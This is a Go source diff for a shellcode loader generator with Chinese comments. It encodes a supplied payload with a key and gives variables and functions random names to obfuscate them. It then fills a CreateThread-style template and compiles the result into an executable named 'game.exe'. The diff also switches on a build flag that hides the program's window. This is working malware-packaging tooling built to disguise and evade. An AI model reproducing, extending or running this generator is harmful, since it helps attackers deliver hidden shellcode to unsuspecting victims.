@@ -24,19 +24,20 @@ var (
 )
 
 func init() {
+	fmt.Println("[*]初始化参数")
 	//初始化key
 	key = getKey()
 	//key变量名
 	keyName = randString(4)
 	//解码方法名
-	decodeName = randString(5)
+	decodeName = randString(4)
 	//生成exe方法名
-	genName = randString(3)
+	genName = randString(4)
 	//混淆方法名
-	gd = randString(6)
+	gd = randString(4)
 
 	//base64变量
-	bbdataName = randString(1)
+	bbdataName = randString(4)
 
 	shellCodeHex = randString(4)
 }
@@ -47,14 +48,18 @@ func getKey() []byte {
 	return b
 }
 
-func randString(len int) string {
-	r := rand.New(rand.NewSource(time.Now().Unix()))
-	bytes := make([]byte, len)
-	for i := 0; i < len; i++ {
-		b := r.Intn(26) + 65
-		bytes[i] = byte(b)
+func randString(l int) string {
+	str := "abcdefghijklmnopqrstuvwxyz"
+	bytes := []byte(str)
+	result := []byte{}
+	r := rand.New(rand.NewSource(time.Now().UnixNano()))
+	time.Sleep(1 * time.Second)
+	for i := 0; i < l; i++ {
+		result = append(result, bytes[r.Intn(len(bytes))])
 	}
-	return string(bytes)
+	ddd := string(result)
+	fmt.Println(ddd)
+	return ddd
 }
 
 func getEnCode(data []byte) string {
@@ -69,8 +74,9 @@ func getEnCode(data []byte) string {
 }
 
 func gen(code *string) {
-
+	//payload
 	*code = strings.ReplaceAll(*code, "$bdata", bdata)
+	//payload名
 	*code = strings.ReplaceAll(*code, "$bbdata", bbdataName)
 	*code = strings.ReplaceAll(*code, "$keyName", keyName)
 	*code = strings.ReplaceAll(*code, "$keys", keys)
@@ -90,32 +96,33 @@ func main() {
 	}
 	sc, _ := ioutil.ReadFile(path)
 	bdata = getEnCode(sc)
-	fmt.Println("获取payload", "---->", path)
+	fmt.Println("[+]获取payload", "---->", path)
 	//fmt.Println(bdata)
 	time.Sleep(1 * time.Second)
 	//ioutil.WriteFile("shellcode.txt", []byte(bdata), 0666)
-	fmt.Println("解析shellcode模板")
+	fmt.Println("[*]解析shellcode模板")
 	time.Sleep(1 * time.Second)
-	tmpl, _ := ioutil.ReadFile("./template")
+	//tmpl, _ := ioutil.ReadFile("./syscal")
+	tmpl, _ := ioutil.ReadFile("./createThread")
 	code := string(tmpl)
-	fmt.Println("生成shellcode")
+	fmt.Println("[*]生成shellcode")
 	time.Sleep(1 * time.Second)
 
 	gen(&code)
 	ioutil.WriteFile("shellcode.go", []byte(code), 0666)
 
-	fmt.Println("编译shellcode")
+	fmt.Println("[*]编译shellcode")
 	time.Sleep(1 * time.Second)
 
-	cmd := exec.Command("cmd.exe", "/c", "go build -ldflags=-s -o game.exe ./shellcode.go")
+	//cmd := exec.Command("cmd.exe", "/c", "go build -ldflags=-s -o game.exe ./shellcode.go")
 	//隐藏窗口，如有需要自行替换
-	//cmd:= exec.Command("cmd.exe","/c","go build -ldflags=-s -ldflags=-H=windowsgui -o game.exe ./shellcode.go")
+	cmd := exec.Command("cmd.exe", "/c", "go build -ldflags=-s -ldflags=-H=windowsgui -o game.exe ./shellcode.go")
 	//阻塞至等待命令执行完成
 	err1 := cmd.Run()
 	if err1 != nil {
 		panic(err1)
 	}
-	fmt.Println("game.exe")
+	fmt.Println("[+]生成 game.exe")
 	os.Remove("shellcode.go")
 
 }
